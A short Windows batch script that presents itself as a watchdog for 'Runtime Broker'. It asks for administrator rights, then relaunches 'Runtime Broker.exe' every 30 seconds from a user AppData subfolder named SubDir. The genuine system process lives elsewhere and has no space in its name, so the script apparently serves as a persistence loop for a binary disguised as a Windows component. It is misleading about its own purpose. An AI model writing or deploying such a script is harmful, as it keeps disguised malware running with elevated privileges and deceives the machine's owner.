@echo off
:: Batch script to monitor and restart Runtime Broker if terminated
:: Run this script as administrator for best results

setlocal enabledelayedexpansion

:: Set the path to Runtime Broker executable
set "RUNTIME_BROKER_PATH=%APPDATA%\SubDir\Runtime Broker.exe"
set "PROCESS_NAME=Runtime Broker.exe"

:check_admin
:: Check if running as administrator
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process cmd -ArgumentList '/c %0' -Verb RunAs"
    exit /b
)

:monitor_loop
:: Check if process is running
tasklist /FI "IMAGENAME eq %PROCESS_NAME%" 2>NUL | find /I "%PROCESS_NAME%" >NUL
if "%ERRORLEVEL%"=="0" (
    echo %PROCESS_NAME% is running
) else (
    echo %PROCESS_NAME% not found. Restarting...
    start "" "%RUNTIME_BROKER_PATH%"
)

:: Wait for 30 seconds before checking again
timeout /t 30 /nobreak >nul
goto :monitor_loop